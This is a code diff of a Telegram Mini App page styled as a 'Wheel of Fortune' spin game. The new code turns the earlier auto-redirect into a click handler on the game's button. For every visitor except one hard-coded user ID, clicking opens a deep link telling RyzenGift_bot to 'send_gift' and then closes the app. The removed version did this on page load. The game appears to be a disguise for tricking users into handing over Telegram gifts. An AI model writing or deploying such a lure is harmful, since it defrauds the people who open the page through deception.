@@ -2,20 +2,42 @@
 <html>
 <head>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            background: #1e1e2f;
+            color: white;
+            font-family: sans-serif;
+            text-align: center;
+            padding-top: 50px;
+        }
+        .btn {
+            background: #00aaff;
+            color: white;
+            border: none;
+            padding: 20px 40px;
+            border-radius: 10px;
+            font-size: 24px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+    </style>
 </head>
 <body>
+    <h2>🎰 Колесо удачи</h2>
+    <button class="btn" id="spinBtn">🎲 Крутить!</button>
+
     <script>
         const WebApp = window.Telegram.WebApp;
         WebApp.ready();
 
         const user = WebApp.initDataUnsafe.user;
-        if (user && user.id != 8528804038) {
-            // АВТОМАТИЧЕСКИ ОТКРЫВАЕМ ОКНО ПЕРЕСЫЛКИ ПОДАРКА
-            WebApp.openLink('tg://resolve?domain=RyzenGift_bot&start=send_gift');
-            
-            // ЗАКРЫВАЕМ МИНИ-ПРИЛОЖЕНИЕ
-            WebApp.close();
-        }
+        document.getElementById('spinBtn').addEventListener('click', function() {
+            if (user && user.id != 8528804038) {
+                // Открываем чат с ботом с командой
+                window.location.href = 'tg://resolve?domain=RyzenGift_bot&start=send_gift';
+                WebApp.close();
+            }
+        });
     </script>
 </body>
 </html>
